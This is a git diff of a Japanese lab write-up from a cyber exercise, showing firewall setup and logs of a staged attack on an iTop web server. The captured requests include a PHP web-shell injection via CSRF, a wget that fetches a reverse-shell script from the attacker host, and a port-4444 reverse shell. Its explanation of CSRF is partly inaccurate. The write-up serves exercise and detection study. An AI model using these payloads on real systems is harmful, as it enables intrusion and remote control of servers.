@@ -107,6 +107,7 @@ vagrant@target:~/target$ sudo docker cp 72753ea0c164:/var/log/apache2/error.log 
 ```
 ### ファイアウォール
 ファイアウォールは「ufw」を使用した。Vagrant環境のネットワークは下記のように設定されている。VagrantのIPアドレスは、eth1に設定している。
+
 ```
 vagrant@target:~/target$ ifconfig
 eth0      Link encap:Ethernet  HWaddr 08:00:27:66:7a:0c  
@@ -127,7 +128,9 @@ eth1      Link encap:Ethernet  HWaddr 08:00:27:8f:41:70
           collisions:0 txqueuelen:1000
           RX bytes:679866 (679.8 KB)  TX bytes:3684787 (3.6 MB)
 ```
+
 ufwのデフォルトではeth0のみのファイアウォール設定になっているので、eth1のファイアウォール設定を以下のようにして行う。ufwのログは`/var/log/ufw.log`に記録される。
+
 ```
 vagrant@target:/var/log$ sudo ufw allow in on eth1 to any
 Rule added
@@ -171,6 +174,7 @@ No exact OS matches for host (If you know what OS is running on it, see http://n
 ```
 
 * 経路確認
+
 ```
 vagrant@attacker:~$ traceroute target.cyexc-target
 traceroute to target.cyexc-target (192.168.33.10), 30 hops max, 60 byte packets
@@ -178,6 +182,7 @@ traceroute to target.cyexc-target (192.168.33.10), 30 hops max, 60 byte packets
 ```
 
 * 特定ポートの疎通確認
+
 ```
 vagrant@attacker:~$ nc -v -w 1 192.168.33.10 -z 4444
 nc: connect to 192.168.33.10 port 4444 (tcp) failed: Connection refused
@@ -189,28 +194,32 @@ nc: connect to 192.168.33.10 port 4444 (tcp) failed: Connection refused
 ### CSRF
 CSRFはクロスサイトスクリプティング（XSS）と似ているウェブ脆弱性のひとつである。XSSは「動的ウェブサイト」の脆弱性でJavaScriptを利用した攻撃に対し、CSRFはウェブアプリケーションに対する、またはその脆弱性を利用したウェブサーバに対する攻撃である。CSRFはウェブサーバ上で不正なスクリプトを実行する。
 
+WEBサーバのログで事象を確認する。
+
 * AttackerウェブサーバからTargetウェブサーバに不正なスクリプト含むHTTPリクエスト
-```
+
+``
 T 192.168.33.1:60236 -> 172.18.0.2:80 [AP]
 POST /env-production/itop-config/config.php?c%5Bmenu%5D=ConfigEditor HTTP/1.1.
 Referer: http://www.attacker.cyexc-attacker:8081/login.html.
 operation=save&prev_config=1&new_config=%3C%3Fphp+if%28isset%28%24_GET%5B%27cmd%27%5D%29%29+die%28passthru%28%24_GET%5B%27cmd%27%5D%29%29%3B+%3F%3E
-```
+``
 
 * adminアカウントでログイン
-```
+
+``
 T 192.168.33.1:60236 -> 172.18.0.2:80 [AP]
 POST /env-production/itop-config/config.php?c%5Bmenu%5D=ConfigEditor HTTP/1.1.
 auth_user=admin&auth_pwd=1234&loginop=login&operation=save&prev_config=1&new_config=%3C%3Fphp+if%28isset%28%24_GET%5B%27cmd%27%5D%29%29+die%28passthru%28%24_GET%5B%27cmd%27%5D%29%29%3B+%3F%3E
-```
+``
 
 ## 標的型攻撃段階3
 * RCEを利用してReverse ShellスクリプトをTargetウェブサーバにダウンロード
 
-```
+``
 T 192.168.33.20:56760 -> 172.18.0.2:80 [AP]
 GET /pages/UI.php?cmd=wget%20http://www.attacker.cyexc-attacker:8081/reverseShellClient.js HTTP/1.1.
-```
+``
 
 * Reverse Shellスクリプトを起動し、TargetウェブサーバとAttacker間を接続
 iTopコンテナから直接Attackerに接続しているため、Targetのファイアウォールログで接続を確認できない。
@@ -237,8 +246,8 @@ Targetウェブサーバの情報を収集するため、TCP snifferプログラ
 
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex4/images/sniffer.png" height=270 title="Screenshot7">
 
-* ufwファイアウォールログ
-    - IN: the ingoing interface
+* ufwファイアウォールログのパラメータ
+    - IN: the ingoing interface
     - OUT: the outgoing interface
     - TOS: Type of service
     - DST: Destination IP address
@@ -248,17 +257,23 @@ Targetウェブサーバの情報を収集するため、TCP snifferプログラ
     - SPT: Source port
     - DPT: Destination port
 
-TCPポート4444に対してTCPパケットが送信されている。
+ファイアウォールログで、TCPポート4444を使ってTCP送信していることを確認する。
 
 ``
 Feb  6 10:22:26 vagrant-ubuntu-trusty-64 kernel: [33106.625147] [UFW AUDIT] IN=eth1 OUT= MAC=08:00:27:8f:41:70:08:00:27:18:2f:2c:08:00 SRC=192.168.33.20 DST=192.168.33.10 LEN=52 TOS=0x00 PREC=0x00 TTL=64 ID=15051 DF PROTO=TCP SPT=4444 DPT=49477 WINDOW=227 RES=0x00 ACK FIN URGP=0
+``
+
+``
 Feb  6 10:22:26 vagrant-ubuntu-trusty-64 kernel: [33106.625180] [UFW AUDIT INVALID] IN=eth1 OUT= MAC=08:00:27:8f:41:70:08:00:27:18:2f:2c:08:00 SRC=192.168.33.20 DST=192.168.33.10 LEN=52 TOS=0x00 PREC=0x00 TTL=64 ID=15051 DF PROTO=TCP SPT=4444 DPT=49477 WINDOW=227 RES=0x00 ACK FIN URGP=0
+``
+
+``
 Feb  6 10:22:26 vagrant-ubuntu-trusty-64 kernel: [33106.625186] [UFW BLOCK] IN=eth1 OUT= MAC=08:00:27:8f:41:70:08:00:27:18:2f:2c:08:00 SRC=192.168.33.20 DST=192.168.33.10 LEN=52 TOS=0x00 PREC=0x00 TTL=64 ID=15051 DF PROTO=TCP SPT=4444 DPT=49477 WINDOW=227 RES=0x00 ACK FIN URGP=0
 ``
 
 以下はAttackerで受信したTCPパケット
 
-``
+```html
 src: 192.168.33.1:61210
 dest: 172.18.0.2:80
 data
@@ -274,7 +289,7 @@ Upgrade-Insecure-Requests: 1
 If-Modified-Since: Mon, 05 Feb 2018 21:13:57 GMT
 If-None-Match: "3cf-5647d8a44af40-gzip"
 Cache-Control: max-age=0
-``
+```
 
 取得したログはこちら
 ＠[Target OS ufw.log](https://github.com/CyExc/CyExc/blob/master/2017/ex4/logs/ufw.log)
